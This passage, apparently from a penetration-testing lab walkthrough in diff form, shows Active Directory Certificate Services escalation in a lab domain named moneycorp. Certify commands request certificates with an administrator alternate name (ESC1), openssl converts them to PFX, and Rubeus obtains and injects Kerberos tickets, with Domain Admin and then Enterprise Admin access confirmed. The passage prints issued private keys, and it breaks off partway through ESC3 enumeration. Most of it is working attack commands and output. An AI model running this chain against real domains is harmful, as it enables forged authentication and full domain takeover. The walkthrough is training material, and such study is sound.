+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Server Authentication
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : SubCA
+    Schema Version                        : 1
+    Validity Period                       : 5 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : <null>
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : HTTPSCertificates
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+Certify completed in 00:00:15.9132020
+```
+
+Sweet! The HTTPSCertificates template grants enrollment rights to RDPUsers group and allows requestor to supply Subject Name. 
+Recall that studentx is a member of RDPUsers group. This means that we can request certificate for any user as studentx. 
+
+Let's request a certificate for Domain Admin - Administrator
+
+* C:\Windows\system32> C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
+```
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : dcorp\student731
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : HTTPSCertificates
+[*] Subject                 : CN=student731, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
+[*] AltName                 : administrator
+
+[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 33
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEA5niomQ13Ks3Cvi9u9M6RC5PdlDgxA9vUHcx3UBLsRI7EfTkM
+eKFW7Rq76ROHvP2JGz75hcSIhtxWqna6nNpel9P28+nIpTHCBQnF9TaFeut15TNe
+qjuLcbHSh+nYM5AW/H8rLM/UjRmA5/pof4odgc6ck1CwAvSAshFd49uXAepJESAl
+OcbGivFZ8k8xQp+CUwh0L6FWCjb3RovL5ZFMoXr3neOm+chJBAV0cCq29KYsl7qd
+asw8WPRyt0F6JDgi1/n6q1/sWP/uYK9nERpXu2612NyB3G1CzTeMPpszgFsZEpRh
+yI5898uizsoeLeFGk5kOmwiBUIAQmEidKFTQ8QIDAQABAoIBAG0lhUr+iooV6f1h
+v11mmmBuRYiVV/ko2XrHQ1YDsCsDpeBb7SEP33foqkdGfYkuVQk3OLp2CeY8YTrX
+gacY76Vdt91pwSEiwGzcZQitKme9LRc/zbw2+OH+QeMmBsLcoVYw74SIZHPyOQ8j
+kuubwD+iVpqZotGzc2NhQCLR8uDvakqCXsD6ynGr3HxnpM6q+ZpbePdZX1ZEUove
+YXLO9YVO7dlLLIn5tFGnU60ig/uMEohVOjLDntkWLxgznKehArHSTC+bIo1IHE3u
+KslBzAEvl7itGiJKqngReMLk+qFt9E3+NtliBU4fLq4n+xjFhmhKaSaaOMLtOzrx
+m/w4iqUCgYEA7SaqH+clOUU5YKzJYYxH7cc6E0Gp0hxLfD9i3KrPP+k0TZGx+jmZ
+08lD6g9w+mNML1Z4cLZ/0xXjRktFgOrZTdAtpfvc+L5OcNmGiI9UK+cxv5HR6rrK
+++36O/r4TxVaN6TgxOQ5rHXB6aIHIm5+7zxNd23bEgnTy/QWQHgVqisCgYEA+MoU
+0DfFNrH5WQoZ+O8usQyZ+7eVY4zCNUE0BpZAjMeMS19rG8l5p46ksZxd6H9N0HJ+
+fU5TxZQWzjlVmZFIYLlEVYcXtPjbl7lWgkezqxUuACHE5PurQtleBOWu1u/gn715
+X5xobE6ycTsoV/sx8ohj4tqRiDWO1DVd4ViSb1MCgYEA2qVGPsm22RmIsCg+NzDF
+9GU1lyF4N96cff5W4Mqe7/bLoSTN6b0HpWqvsfHwoPnB+PcJbinkqjJI67tkZlqg
+ZQyluZ3/+lpDKep0Dh3PZfbvOAdyea8kjKe5iWl3XDp8hkb+cKlWvzmGwif/2e/0
+GhAIAC+JxhTHcAgoJ+JPXycCgYEAqAHHlmjjHDGJwnBI48uZy2RIJC1wi76Fc/Mp
+T/1tb+RdwJSaPzSKm/V/EJYY8KXvhYGcG8CmX7nGwNMFFGSA7RiPpfZJsyOPH2HA
+otAK69CstNgZH804dTdW/5WfwXRSS21npoJ4HhPy+vZJI0j2DOPAGHUjbElGv9We
+JUxr7xMCgYEAlSviueNHWc4ZcfPNTV9tv/AgPGj4rkxEG8lzCnV2rlJWtYKZec2k
+9191z0nXAB2pRXzTD1g8lqvhQAO3U3FcqMa8VGHAlYH6GCZvJDHefMLaKLK/Og1X
+vwVe4ERKPsH7CJrd+XUNUEyggAkffoSOM29yk494NZhplPo2N4aHn8Q=
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGYjCCBUqgAwIBAgITFQAAACEFIQ6alFc2ygAAAAAAITANBgkqhkiG9w0BAQsF
+ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
+eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTA5MzAw
+MDIyMzBaFw0yNzA5MzAwMDMyMzBaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
+MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
+cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50NzMxMIIBIjAN
+BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5niomQ13Ks3Cvi9u9M6RC5PdlDgx
+A9vUHcx3UBLsRI7EfTkMeKFW7Rq76ROHvP2JGz75hcSIhtxWqna6nNpel9P28+nI
+pTHCBQnF9TaFeut15TNeqjuLcbHSh+nYM5AW/H8rLM/UjRmA5/pof4odgc6ck1Cw
+AvSAshFd49uXAepJESAlOcbGivFZ8k8xQp+CUwh0L6FWCjb3RovL5ZFMoXr3neOm
++chJBAV0cCq29KYsl7qdasw8WPRyt0F6JDgi1/n6q1/sWP/uYK9nERpXu2612NyB
+3G1CzTeMPpszgFsZEpRhyI5898uizsoeLeFGk5kOmwiBUIAQmEidKFTQ8QIDAQAB
+o4IDDjCCAwowPQYJKwYBBAGCNxUHBDAwLgYmKwYBBAGCNxUIheGocofMn2jhhyaC
+n65RgvL2fYE/hpePdoe0hBICAWQCAQYwKQYDVR0lBCIwIAYIKwYBBQUHAwIGCCsG
+AQUFBwMEBgorBgEEAYI3CgMEMA4GA1UdDwEB/wQEAwIFoDA1BgkrBgEEAYI3FQoE
+KDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQwRAYJKoZI
+hvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAcGBSsO
+AwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBSdwIZo+FCsqSgBiBA1q+riIiBjfTAo
+BgNVHREEITAfoB0GCisGAQQBgjcUAgOgDwwNYWRtaW5pc3RyYXRvcjAfBgNVHSME
+GDAWgBTR/o0Kp/q0Mp82/CC498ueaMVF7TCB2AYDVR0fBIHQMIHNMIHKoIHHoIHE
+hoHBbGRhcDovLy9DTj1tb25leWNvcnAtTUNPUlAtREMtQ0EsQ049bWNvcnAtZGMs
+Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
+PUNvbmZpZ3VyYXRpb24sREM9bW9uZXljb3JwLERDPWxvY2FsP2NlcnRpZmljYXRl
+UmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Q
+b2ludDCBywYIKwYBBQUHAQEEgb4wgbswgbgGCCsGAQUFBzAChoGrbGRhcDovLy9D
+Tj1tb25leWNvcnAtTUNPUlAtREMtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUy
+MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bW9uZXlj
+b3JwLERDPWxvY2FsP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0
+aWZpY2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3DQEBCwUAA4IBAQBVCk4EyDerfdh6
+oJNb8eYpz04bDdnpI/eCNNovAdM29aPlUu50ab02vko7dcJxPJ5c8jQqlt8konNj
+1n1uoK2tf9lv9LeS0zVVzQy7Q5KvgrOvKA8P2Au+USim3IITWGnPEhpJO9KjIiPU
+JnXFD7MGLtOq5Y4yTtEU1A2ct4HKQW+7BWk+bgfPgD2CGuqhJqphb/ccS22i1Z2G
+BbDBAsLjIVId488mu8ZbxcV3cxM+XdWyF8IQg2IrthQ8+yycI2FnRJ875HWuTEH+
+wdYrQe6Z7M8vgyajQLWf2HcHwbZ+HJm9JlXX+/GFKlmCh0dqMKDARdmdAys/BJST
+mrO8PBOk
+-----END CERTIFICATE-----
+
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+Certify completed in 00:00:05.3735595
+```
+
+Copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE----- and save it to esc1.pem
+
+We need to convert it to PFX to use it. 
+Use openssl binary on the student VM to do that. I will use SecretPass@123 as the export password
+
+![alt text](image-50.png)
+
+* C:\AD\Tools> C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
+```
+WARNING: can't open config file: /usr/local/ssl/openssl.cnf
+Enter Export Password:
+Verifying - Enter Export Password:
+```
+
+Use the PFX created above with Rubeus to request a TGT for DA - Administrator!
+
+* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt
+
+```_____ _
+ (_____ \ | |
+ _____) )_ _| |__ _____ _ _ ___
+ | __ /| | | | _ \| ___ | | | |/___)
+ | | \ \| |_| | |_) ) ____| |_| |___ |
+ |_| |_|____/|____/|_____)____/(___/
+ V2.2.1
+[*] Action: Ask TGT
+[*] Using PKINIT with etype rc4_hmac and subject: CN=studentx, CN=Users, 
+DC=dollarcorp, DC=moneycorp, DC=local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 
+'dollarcorp.moneycorp.local\administrator'
+[+] TGT request successful!
+```
+
+Check if we actually have DA privileges now:
+
+* C:\AD\Tools> winrs -r:dcorp-dc cmd /c set username
+```
+USERNAME=administrator
+```
+
+Awesome! We can use similar method to escalate to Enterprise Admin privileges. Request a certificate 
+for Enterprise Administrator - Administrator
+
+* C:\AD\Tools> C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
+
+```
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : dcorp\student731
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : HTTPSCertificates
+[*] Subject                 : CN=student731, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
+[*] AltName                 : moneycorp.local\administrator
+
+[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 35
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAwuFVC9GjEmKKHCbqGEmYAvAB2H5pYjkSDZeh5IKMBaSHzszx
+eicYWCpWvm0vyIWr2tWN5sIE5ptrYqGN6zhoP8PpC02FyXso1I/vDc+JiEqZTOKm
+UfnyrClktHUE6REk/oME8kouD0DhlZB8qA3Vp+gDG9JFG+SKkuwEeWN93mejCRIv
+PuCdU51YkNrQ8UE1SFGQigzTUVo5Np81+dP0PpsnS2EqxcI6l4qJPx347RjARaBo
+f80NzkcGjjw+/zapKzIHae6SfNlHa1nzwBNqxLP2jTKnP84VUtXrWRuwTX5YTXrs
+83+MJn/L8J1nBEs7/2CQAq16aghrHvXgl5k1YQIDAQABAoIBAQCyoevcBpBs5Mhm
+H8GK+8KMRsXaVZ1xvJBwxyJNnOCOt48JH9DlQHrPLhgPO3SGYQjzcbc943CslaAs
+a5v0FeNxN7ohczEES5FUro7Y4PjXZlH5KPR9xhgMeXDm/TDAFsgLR7u8AAUSVE2z
+VBr/zJag70oSMX7Jn4bqP8+mGW2h81DJscxr3sYV0TIw007JpKxVaDa9C9i0zuVV
+hw9Is81E8JzehDUovnJ+pLEaIk+fsGjJWbskLb0wzJ2ncuwY7iXKCAl8/KIu69x8
+VGDhHVLqT/1b2mlzblLsU7MPRw4JK2y8fV0HwqRwASTQValJPSu8alkWKnBqUPmw
+MschrUm1AoGBAPFL7SnNr4ksMh3B8lBzsoluIon8dVHfFWOvm7/zfJFWGanBSZIU
+hm8tXj+6PegMLhYsW9fqAxBc6PgOHjrGvuMp2x7PsrRLBfF4Y+Ps4qZ/wPqARZ+t
+BWcoTE5YX2FilSe2+KSnQMyDhPHzty/JdVb6PBsjkoXMn3fuS2i0bdpjAoGBAM7B
+VvTxb5hIcJyn8X/isoXzSA+pvIWdlZNmchKm/G8FPLtw77KUvjQUor+6odCzXqsh
+iYNyhYGk/eg7aUNuiED5SlBPTtbe/IRXz0o7EUhgd0ifGH/p/ei0D7qf4VBLChjs
+nbG+UEeLmmo6fiKKbw1obRHuNKvMy8T6VHuk4bprAoGBAImfl4YHRX4EUhU84DrY
+slTGFzcCYduvVCDGMRwbAMpYBE0Y7CBASqiwhJfuXo6yG7sT09JjKxozE8EfNEir
+wIYKAmshZTiFrb8avkZqfp8eMG/vp0Y6ReGfT15D8yq1MoMzTb+DkWbUAIiLS8ka
+qy1PjeagtFpR6gZaSHJQrnMnAoGAREHH922NrfScWNuI+vNYhKhgbetXdbUkoFj9
+5/KA/BX6itcqCwbYFFGLuUhgC4psAos73s18DeTufjC++6gOC4VBZ2oHWSCctQRY
+RuVhO0e9mZgMeo5BaQWo+6+0rtFXMAtNtFRkJHqOK+vLoJObPg3vlC/T67Pcwdby
+9S7l5qkCgYBUpwG8ENGpDXW5Uq7m9UXtdOiFRz+a7ZAe4QLIhNNs+PKCELeYTLNO
+PRapuXfnApkNHx5088WzKVhdGDse92/+VNwlDBMtGDilGkt/4QTeRyntlt4pPmEE
+BZFhhzdNZcrFyHHSODwEnj0JWq9+c760Tqkyp1sZsKp0gvxGD+PWrQ==
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGcjCCBVqgAwIBAgITFQAAACNnQDVvpqyyjQAAAAAAIzANBgkqhkiG9w0BAQsF
+ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
+eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTA5MzAw
+MDQ0MDVaFw0yNzA5MzAwMDU0MDVaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
+MBcGCgmSJomT8ixkARkWCW1vbmV5Y29ycDEaMBgGCgmSJomT8ixkARkWCmRvbGxh
+cmNvcnAxDjAMBgNVBAMTBVVzZXJzMRMwEQYDVQQDEwpzdHVkZW50NzMxMIIBIjAN
+BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwuFVC9GjEmKKHCbqGEmYAvAB2H5p
+YjkSDZeh5IKMBaSHzszxeicYWCpWvm0vyIWr2tWN5sIE5ptrYqGN6zhoP8PpC02F
+yXso1I/vDc+JiEqZTOKmUfnyrClktHUE6REk/oME8kouD0DhlZB8qA3Vp+gDG9JF
+G+SKkuwEeWN93mejCRIvPuCdU51YkNrQ8UE1SFGQigzTUVo5Np81+dP0PpsnS2Eq
+xcI6l4qJPx347RjARaBof80NzkcGjjw+/zapKzIHae6SfNlHa1nzwBNqxLP2jTKn
+P84VUtXrWRuwTX5YTXrs83+MJn/L8J1nBEs7/2CQAq16aghrHvXgl5k1YQIDAQAB
+o4IDHjCCAxowPQYJKwYBBAGCNxUHBDAwLgYmKwYBBAGCNxUIheGocofMn2jhhyaC
+n65RgvL2fYE/hpePdoe0hBICAWQCAQYwKQYDVR0lBCIwIAYIKwYBBQUHAwIGCCsG
+AQUFBwMEBgorBgEEAYI3CgMEMA4GA1UdDwEB/wQEAwIFoDA1BgkrBgEEAYI3FQoE
+KDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQwRAYJKoZI
+hvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAcGBSsO
+AwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBSC08Pnx/PE1Fd86HyCnFbpH34eZzA4
+BgNVHREEMTAvoC0GCisGAQQBgjcUAgOgHwwdbW9uZXljb3JwLmxvY2FsXGFkbWlu
+aXN0cmF0b3IwHwYDVR0jBBgwFoAU0f6NCqf6tDKfNvwguPfLnmjFRe0wgdgGA1Ud
+HwSB0DCBzTCByqCBx6CBxIaBwWxkYXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQLURD
+LUNBLENOPW1jb3JwLWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
+cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW1vbmV5Y29ycCxEQz1s
+b2NhbD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9
+Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcsGCCsGAQUFBwEBBIG+MIG7MIG4BggrBgEF
+BQcwAoaBq2xkYXA6Ly8vQ049bW9uZXljb3JwLU1DT1JQLURDLUNBLENOPUFJQSxD
+Tj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1
+cmF0aW9uLERDPW1vbmV5Y29ycCxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/
+b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
+AAOCAQEA0kDYBKTW6aR0pU0ja/osPBRntct1wkNtgh2Evyd5tVe4L+yfs8zNr+7b
+0RwW1oP7EaQ+avRNLyuO7rs8Nu1B4wXUj4GR5hnS9OkZzTz3ZkLtVpxq5imGeppd
+s1xomOQXpxUp+3RpDtzBKvdTnV4RCrBFCIk4sQbnLZFU5MWiVxgiZvTSxnhpE2eQ
+IObJ5UnSX5vvyyKoG/36PxUZ8W1e4WFtfoR+qugf+dKGT+0i0cq6uHkuWoeeCfIQ
+VJgt3+gzVd7i3OBbrZ7igP0dQyaMST2JvqcDAbwJy1dE9mMZx4myg/ogfuZOKwSe
+FjBZ3dCjdvb5WWxWfhEEjfnik8N73g==
+-----END CERTIFICATE-----
+
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+Certify completed in 00:00:05.0649105
+```
+
+Save the certificate to esc1-EA.pem and convert it to PFX. I will use SecretPass@123 as the export 
+password
+
+* C:\AD\Tools> C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
+```
+WARNING: can't open config file: /usr/local/ssl/openssl.cnf
+Enter Export Password:
+Verifying - Enter Export Password:
+unable to write 'random state'
+```
+
+Use Rubeus to request TGT for Enterprise Administrator - Administrator
+
+* C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc,moneycorp.local /certificate:esc1-EA.pfx /password:SecretPass@123 /ptt
+
+Finally, access mcorp-dc
+
+* C:\AD\Tools>winrs -r:mcorp-dc cmd /c set username
+```
+USERNAME=administrator
+```
+
+### Privilege Escalation to DA and EA using ESC3
+
+If we list vulnerable templates in moneycorp, we get the following result
+
+C:\AD\Tools> C:\AD\Tools\Certify.exe find /vulnerable
+
+```
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'
+
+[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'
+
+    Enterprise CA Name            : moneycorp-MCORP-DC-CA
+    DNS Hostname                  : mcorp-dc.moneycorp.local
+    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
+    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
+    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
+    Cert Start Date               : 11/26/2022 1:59:16 AM
+    Cert End Date                 : 11/26/2032 2:09:15 AM
+    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
+    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : SmartCardEnrollment-Agent
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Certificate Request Agent
+    mspki-certificate-application-policy  : Certificate Request Agent
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+Certify completed in 00:00:16.3286459
+```
+
+The "SmartCardEnrollment-Agent" template has EKU for Certificate Request Agent and grants 
+enrollment rights to Domain users. If we can find another template that has an EKU that allows for 
+domain authentication and has application policy requirement of certificate request agent, we can 
+request certificate on behalf of any user.
+
+* C:\AD\Tools>C:\AD\Tools\Certify.exe find
+```
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=moneycorp,DC=local'
+
+[*] Listing info about the Enterprise CA 'moneycorp-MCORP-DC-CA'
+
+    Enterprise CA Name            : moneycorp-MCORP-DC-CA
+    DNS Hostname                  : mcorp-dc.moneycorp.local
+    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local
+    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8
+    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49
+    Cert Start Date               : 11/26/2022 1:59:16 AM
+    Cert End Date                 : 11/26/2032 2:09:15 AM
